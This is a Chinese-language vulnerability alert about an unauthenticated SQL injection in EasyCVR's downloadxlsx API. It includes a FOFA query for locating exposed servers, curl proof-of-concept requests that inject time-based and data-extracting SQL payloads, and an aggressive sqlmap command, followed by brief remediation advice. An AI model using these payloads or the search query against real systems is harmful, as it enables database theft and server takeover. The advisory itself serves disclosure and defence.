---
title: 【漏洞预警】EasyCVR downloadxlsx SQL注入漏洞
---

## 漏洞概述
EasyCVR downloadxlsx 存在SQL注入漏洞，未经身份验证的远程攻击者可利用SQL注入获取数据库敏感信息，甚至写入木马获取服务器系统权限。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | EasyCvr downloadxlsx 存在sql注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | EasyCvr |
| 严重程度 | 高危 |

## FOFA查询
```
(body="EasyGBS" || body="EasyDarwin.Body" || body="EasyCVR") && (title="" || title="EasyCVR")
```

## POC
```bash
# 延时注入检测（延时4秒）
curl "http://target/api/vl/cascade/downloadxlsx?token=and(select*from(select/**/sleep(4))a/**/union/**/select+1)='"

# 获取数据库版本
curl "http://target/api/vl/cascade/downloadxlsx?token=and(select*from(select/**/concat(@@version))a/**/union/**/select+1)='"

# 获取数据库名
curl "http://target/api/vl/cascade/downloadxlsx?token=and(select*from(select/**/database())a/**/union/**/select+1)='"
```

特征：响应延时约4秒

使用sqlmap:
```bash
sqlmap -u "http://target/api/vl/cascade/downloadxlsx?token=test" --level=5 --risk=3
```

## 修复建议
1. 联系厂商升级版本
2. 部署Web应用防火墙
3. 关闭互联网暴露面